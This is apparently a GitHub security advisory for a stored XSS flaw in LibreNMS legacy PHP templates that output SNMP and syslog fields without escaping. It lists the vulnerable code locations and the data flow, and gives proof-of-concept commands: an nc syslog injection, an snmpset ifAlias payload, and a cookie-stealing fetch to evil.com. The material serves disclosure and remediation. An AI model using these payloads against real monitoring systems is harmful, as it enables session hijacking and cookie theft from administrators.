# [H] LibreNMS — Stored XSS via SNMP/Syslog Data in Legacy Templates

## Summary
Severity: High
Advisory: GHSA-7w8c-qgxg-m7jx
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N (CVSS_V3)
Published: 2026-08-26
Source: https://github.com/advisories/GHSA-7w8c-qgxg-m7jx
Type: github-advisory

## Affected
- Packagist: `librenms/librenms` — affected >=0 <26.5.0

## Details
## Summary

Multiple legacy PHP template files in LibreNMS directly output SNMP-sourced and syslog-sourced data into HTML without escaping. An attacker who controls a monitored network device (via compromised SNMP agent or syslog sender) can inject arbitrary JavaScript that executes when any authenticated LibreNMS user views the affected pages.

## Vulnerable Code

### Location 1: Syslog `program` field (clearest instance)

**File:** `includes/html/print-syslog.inc.php:11,13`

```php
$syslog_output .= '<td><strong>' . $entry['program'] . ' : </strong> ' . htmlspecialchars((string) $entry['msg']) . '</td>';
```

The `program` field is output without `htmlspecialchars()` while the adjacent `msg` field IS properly escaped. The `program` value comes from syslog messages received from monitored devices.

### Location 2: Alert details `ifAlias` (highest impact — main alerts page)

**File:** `includes/html/functions.inc.php:607`

```php
$fault_detail .= $tmp_alerts['ifAlias'] . '; ';
```

The `ifAlias` (port description) comes from SNMP polling and is stored in the `ports` table. When a port-related alert fires, `format_alert_details()` renders it unescaped. Multiple other fields in this function are also unescaped: `isisISAdjIPAddrAddress` (line 598), `service_desc`/`service_message` (lines 656,658), `bgpPeerDescr` (line 672), `mempool_descr` (line 686), `app_type` (line 709).

### Location 3: Health pages — `mempool_descr`, `storage_descr`, `sensor_descr`

**File:** `includes/html/pages/device/health/mempool.inc.php:38`
```php
echo "<h3 class='panel-title'>{$mempool->mempool_descr} ...";
```

**File:** `includes/html/pages/device/health/storage.inc.php:27`
```php
echo "<h3 class='panel-title'>{$drive['storage_descr']} ...";
```

**File:** `includes/html/pages/device/health/sensors.inc.php:29`
```php
echo "<h3 class='panel-title'>$sensor_descr ...";
```

All three health page templates output SNMP-polled descriptions directly into `<h3>` tags without escaping.

### Location 4: Pseudowires `ifAlias`

**File:** `includes/html/pages/pseudowires.inc.php:76`
```php
echo "<tr ...><td colspan=2>" . $pw_a['ifAlias'] . '</td><td colspan=2>' . $pw_b['ifAlias'] . '</td></tr>';
```

### Location 5: VRF page `ifAlias`

**File:** `includes/html/pages/routing/vrf.inc.php:165`
```php
echo "<div style='font-size: 9px;'>" . substr((string) short_port_descr($port['ifAlias']), 0, 22) . '</div>';
```

## Data Flow

```
Attacker-controlled SNMP device/syslog source
  → SNMP polling stores ifAlias/mempool_descr/etc in DB (no sanitization on write)
  → OR syslog receiver stores program field in syslog table
  → Authenticated user views alerts/health/syslog page
  → Legacy PHP template echoes raw value into HTML
  → XSS executes in victim's browser session
```

## Attack Scenario

1. Attacker compromises or controls a network device monitored by LibreNMS
2. Attacker configures the device's SNMP interface description (ifAlias) to: `<img src=x onerror="fetch('https://evil.com/'+document.cookie)">`
3. LibreNMS polls the device via SNMP and stores the malicious ifAlias in the `ports` table
4. When any alert fires for this port, the XSS payload executes for every authenticated user viewing the alerts page
5. Alternatively: attacker sends syslog messages with XSS in the program field, targeting the syslog viewer page

## PoC

### Syslog vector (simplest)
```bash
# Send syslog message with XSS in program field
# Assuming LibreNMS syslog receiver is at 10.0.0.1:514
echo '<14>Mar 20 12:00:00 rogue-device <img/src=x onerror=alert(document.domain)>: test message' | nc -u 10.0.0.1 514
```

### SNMP vector
```bash
# On attacker-controlled SNMP device, set interface description:
# snmpset -v2c -c private localhost IF-MIB::ifAlias.1 s '<img src=x onerror=alert(document.cookie)>'
# LibreNMS will poll this during next discovery/polling cycle
```

## Contrast with Properly Escaped Code

Newer Blade templates and some legacy code properly escape SNMP data:
- `includes/html/dev-overview-data.inc.php` uses `Clean::html()` for sysDescr, sysName, hardware
- `app/Http/Controllers/Device/Tabs/PortsController.php` uses `htmlentities()` on ifAlias
- `app/Http/Controllers/Table/EventlogController.php:97` uses `htmlspecialchars()` on message
- All Blade templates use `{{ }}` auto-escaping

The vulnerability exists specifically in the legacy `includes/html/` PHP files that have not been migrated to Blade.

## References
- https://github.com/librenms/librenms/security/advisories/GHSA-7w8c-qgxg-m7jx
- https://github.com/librenms/librenms/pull/19660
- https://github.com/librenms/librenms/commit/6782af940c3c495755923b520a302f3a1cb1ce6b
- https://github.com/librenms/librenms
- https://github.com/librenms/librenms/releases/tag/26.5.0
- https://github.com/librenms/librenms/releases/tag/26.8.1
